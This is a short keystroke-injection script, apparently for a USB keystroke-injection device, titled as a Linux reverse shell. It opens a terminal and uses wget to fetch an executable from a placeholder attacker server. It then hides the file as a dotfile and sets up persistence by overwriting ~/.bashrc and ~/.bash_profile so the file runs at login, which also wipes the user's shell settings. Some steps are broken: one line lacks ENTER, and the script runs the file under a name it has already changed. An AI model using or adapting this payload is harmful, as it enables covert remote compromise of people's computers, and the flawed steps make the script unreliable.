REM Linux reverse shell 
DELAY 1000
CTRL-ALT t
DELAY 2000
STRING clear
ENTER
DELAY 50
STRING wget http://<your_server_ip>/executable
ENTER
DELAY 3000
STRING chmod +x executable
ENTER
STRING mv executable .executable
DELAY 50
STRING echo "${PWD}/.executable"> ~/.bashrc
ENTER
STRING echo "${PWD}/.executable"> ~/.bash_profile
ENTER
STRING ./executable
ENTER
STRING exit
ENTER
